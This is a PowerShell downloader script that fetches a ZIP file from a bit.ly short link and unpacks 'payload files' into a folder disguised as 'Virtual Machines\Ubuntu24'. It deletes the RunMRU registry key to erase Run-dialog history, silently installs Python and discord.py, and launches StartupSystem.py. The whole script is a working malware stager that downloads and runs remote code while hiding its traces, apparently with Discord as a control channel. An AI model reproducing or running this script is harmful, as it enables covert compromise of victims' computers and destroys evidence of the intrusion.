# downloader.ps1

# Variables
$D = $env:TEMP
$zipUrl = "https://bit.ly/3EBhGQ4"
$zipFile = "$D\js17.zip"
$destDir = "$env:USERPROFILE\Documents\Virtual Machines\Ubuntu24\"
$execPath = "$env:USERPROFILE\Documents\Virtual Machines\Ubuntu24\StartupSystem.py"

$installPath = "$env:USERPROFILE\Documents\Virtual Machines\Ubuntu24\installPython.ps1"

# Step 1: Download the ZIP file
Invoke-RestMethod $zipUrl -O $zipFile

# Step 2: Extract the ZIP file
Expand-Archive $zipFile -DestinationPath $D -Force

# Step 3: Create the target directory if it doesn't exist
if (-not (Test-Path $destDir)) {
    New-Item -Path $destDir -ItemType Directory -Force
}

# Step 4: Move payload files to the target directory
Move-Item "$D\js17\ubuntu24.ps1" -Destination $destDir -Force
Move-Item "$D\js17\ALT.WAV" -Destination $destDir -Force
Move-Item "$D\js17\WIN.WAV" -Destination $destDir -Force
Move-Item "$D\js17\PIANO.WAV" -Destination $destDir -Force
Move-Item "$D\js17\ubuntu25.ps1" -Destination $destDir -Force
Move-Item "$D\js17\reinstate.ps1" -Destination $destDir -Force
Move-Item "$D\js17\resound.ps1" -Destination $destDir -Force
Move-Item "$D\js17\shortcutmaker.ps1" -Destination $destDir -Force
Move-Item "$D\js17\SoundVolumeView.exe" -Destination $destDir -Force
Move-Item "$D\js17\StartupSystem.py" -Destination $destDir -Force

Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Recurse -Force

# Step 6: Install Python and dependencies
$pythonVersion = & python --version 2>$null

if ($LASTEXITCODE -ne 0) {
    Write-Host "Python not found. Installing Python..."

    # Step 6.1: Download the Python installer (replace with desired version)
    $pythonInstallerUrl = "https://www.python.org/ftp/python/3.11.5/python-3.11.5-amd64.exe"
    $pythonInstaller = "$env:TEMP\python_installer.exe"

    Invoke-WebRequest -Uri $pythonInstallerUrl -OutFile $pythonInstaller

    # Step 6.2: Run the installer silently
    Start-Process -FilePath $pythonInstaller -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1" -Wait

    # Step 6.3: Remove the installer
    Remove-Item $pythonInstaller

    Write-Host "Python installed successfully."
} else {
    Write-Host "Python is already installed: $pythonVersion"
}

# Step 6.4: Install the dependencies
Write-Host "Installing dependencies from requirements.txt..."
pip install discord.py
Write-Host "Installed Discord"


# Step 7: Run the startup python file
Start-Process "python" -ArgumentList $execPath
